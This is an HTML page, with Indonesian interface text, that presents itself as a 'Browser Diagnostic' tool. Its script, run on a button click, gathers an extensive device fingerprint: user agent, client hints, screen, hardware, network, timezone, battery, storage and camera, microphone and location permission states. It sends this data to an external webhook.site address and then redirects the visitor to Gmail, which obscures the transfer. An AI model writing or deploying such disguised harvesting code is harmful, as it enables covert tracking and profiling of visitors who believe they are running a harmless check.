<!DOCTYPE html>
<html lang="id">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<title>Browser Diagnostic</title>

<style>

body{
    margin:0;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#202124;
    font-family:Arial,sans-serif;
}

.card{
    background:white;
    width:90%;
    max-width:420px;
    padding:35px;
    border-radius:18px;
    text-align:center;
    box-shadow:0 10px 30px #0005;
}

button{
    width:100%;
    padding:15px;
    border:0;
    border-radius:10px;
    background:#1a73e8;
    color:white;
    font-size:17px;
    cursor:pointer;
}

button:disabled{
    background:#777;
}

#status{
    margin-top:20px;
}

</style>

</head>


<body>


<div class="card">

<h2>Continue</h2>

<p>Browser Diagnostic</p>

<button id="send">
Kirim Data
</button>

<div id="status">
Ready
</div>

</div>



<script>


const WEBHOOK =
"https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";



async function getBattery(){

try{

if(navigator.getBattery){

let b =
await navigator.getBattery();

return {

level:
Math.round(b.level*100)+"%",

charging:
b.charging,

chargingTime:
b.chargingTime,

dischargingTime:
b.dischargingTime

};

}

}catch(e){}

return null;

}



async function getStorage(){

try{

if(navigator.storage){

return await navigator.storage.estimate();

}

}catch(e){}

return null;

}



async function getPermissions(){

let list=[
"geolocation",
"camera",
"microphone",
"notifications"
];


let result={};


if(!navigator.permissions)
return result;



for(let p of list){

try{

let r=
await navigator.permissions.query({
name:p
});

result[p]=r.state;

}catch(e){

result[p]="unsupported";

}

}


return result;

}



async function collect(){


const n=navigator;

const c =
n.connection ||
n.webkitConnection ||
n.mozConnection;



let data={


event:
"browser_diagnostic_full",


timestamp:
new Date().toISOString(),



page:{

url:
location.href,

title:
document.title,

referrer:
document.referrer,

visibility:
document.visibilityState

},



browser:{

userAgent:
n.userAgent,

language:
n.language,

languages:
n.languages,

platform:
n.platform,

vendor:
n.vendor,

appVersion:
n.appVersion,

online:
n.onLine,

cookieEnabled:
n.cookieEnabled,

doNotTrack:
n.doNotTrack || null

},



clientHints:{},




screen:{

width:
screen.width,

height:
screen.height,

availWidth:
screen.availWidth,

availHeight:
screen.availHeight,

colorDepth:
screen.colorDepth,

pixelDepth:
screen.pixelDepth,

pixelRatio:
window.devicePixelRatio

},



window:{

innerWidth:
innerWidth,

innerHeight:
innerHeight,

outerWidth:
outerWidth,

outerHeight:
outerHeight,

scrollX:
scrollX,

scrollY:
scrollY

},



device:{

cpu:
n.hardwareConcurrency || null,

memory:
n.deviceMemory || null,

touch:
n.maxTouchPoints>0,

touchPoints:
n.maxTouchPoints || 0

},



network:
c ? {

type:
c.effectiveType,

downlink:
c.downlink,

rtt:
c.rtt,

saveData:
c.saveData

}:null,



timezone:{

zone:
Intl.DateTimeFormat()
.resolvedOptions()
.timeZone,

locale:
Intl.DateTimeFormat()
.resolvedOptions()
.locale,

offset:
new Date().getTimezoneOffset(),

local:
new Date().toString()

},



display:{

darkMode:
matchMedia("(prefers-color-scheme:dark)").matches,

reducedMotion:
matchMedia("(prefers-reduced-motion:reduce)").matches,

colorGamut:
matchMedia("(color-gamut:p3)").matches

},



hardwareAPI:{

bluetooth:
!!navigator.bluetooth,

usb:
!!navigator.usb,

mediaDevices:
!!navigator.mediaDevices

},



storage:
await getStorage(),


battery:
await getBattery(),


permissions:
await getPermissions()


};



try{


if(n.userAgentData){

data.clientHints =
await n.userAgentData.toJSON();

}


}catch(e){}



return data;


}





document
.getElementById("send")
.onclick=async function(){


this.disabled=true;


let status=
document.getElementById("status");


status.innerHTML=
"Mengumpulkan...";



let data =
await collect();



let params =
new URLSearchParams();



for(let key in data){

params.append(

key,

typeof data[key]=="object"
?
JSON.stringify(data[key])
:
data[key]

);

}



fetch(
WEBHOOK+"?"+params.toString()
)

.then(()=>{


status.innerHTML=
"Terkirim";


setTimeout(()=>{

location.href=
"https://mail.google.com";

},1000);


})

.catch(()=>{


status.innerHTML=
"Gagal";


});


};


</script>


</body>

</html>
